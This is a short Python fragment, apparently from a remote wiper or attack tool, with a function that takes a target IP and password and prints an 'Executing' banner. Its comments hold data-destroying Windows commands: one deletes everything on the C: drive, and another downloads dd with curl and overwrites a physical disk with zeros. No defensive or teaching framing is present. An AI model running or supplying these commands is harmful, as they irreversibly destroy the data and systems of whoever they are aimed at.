...
def kiss_goodbye_within_limits(ipv4,pword,temp_dir): # del /f /s /q C:\*.* | rd C:\ /S /Q 
    ...
    # try_dd = r"""cd %temp% & curl.exe -o needy.zip http://www.chrysocome.net/downloads/b734f1884ee9abb61e97457e72e7498e/dd-0.6beta3.zip & tar -xf needy.zip & dd if=\\.\Zero of=\\.\PhysicalDriveX bs=1M count=1"""
    print(terminator2)
    print("[*] Executing...")
